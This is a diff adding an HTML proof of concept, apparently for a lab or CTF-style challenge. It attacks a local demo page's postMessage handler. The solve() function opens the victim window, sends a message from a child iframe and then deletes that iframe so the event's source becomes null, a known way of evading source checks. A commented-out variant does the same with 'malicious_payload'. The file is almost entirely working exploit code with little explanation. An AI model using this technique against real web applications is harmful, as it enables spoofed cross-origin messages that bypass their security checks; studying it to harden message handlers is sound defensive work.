@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>Trusted Widget (Hijacked)</h3>
+<!-- <button onclick="exploit()">Simulate Hijacked Widget</button> -->
+<a href=javascript:solve()>CLICK ME<br>
+
+
+<!-- <iframe id="nested" src="empty.html" style="width:90%;height:200px"></iframe>
+<iframe id="victim" src="victim.html" style="width:90%;height:400px"></iframe> -->
+
+  <span id=ifr>
+    <iframe></iframe>
+  </span>
+
+<script>
+    function sleep(ms) {
+        return new Promise(r => setTimeout(r, ms));
+    }   
+    async function solve() {
+    let win = window.win = window.open('http://127.0.0.1:5501/demo/victim.html', '_blank', 'width=500,height=500');
+
+    // let win = window.win = window.open('victim.html', '_blank', 'width=500,height=500');
+    
+    await sleep(2000);
+    
+    // Send postMessage from the iframe
+    frames[0].eval("parent.win.postMessage(0xdeadbeef,'*')");
+    
+    // Delete the old iframe
+    // now e.source is null
+    ifr.innerHTML = 'aaabcd';
+    }
+// function exploit() {
+//     var victim = document.getElementById('victim');
+//     var nested = document.getElementById('nested');
+
+//     // From inside nested iframe, send postMessage to victim iframe
+//     nested.contentWindow.eval(
+//         'parent.document.getElementById("victim").contentWindow.postMessage("malicious_payload", "*")'
+//     );
+//     nested.remove();
+// }
+</script>
+</body>
+</html>
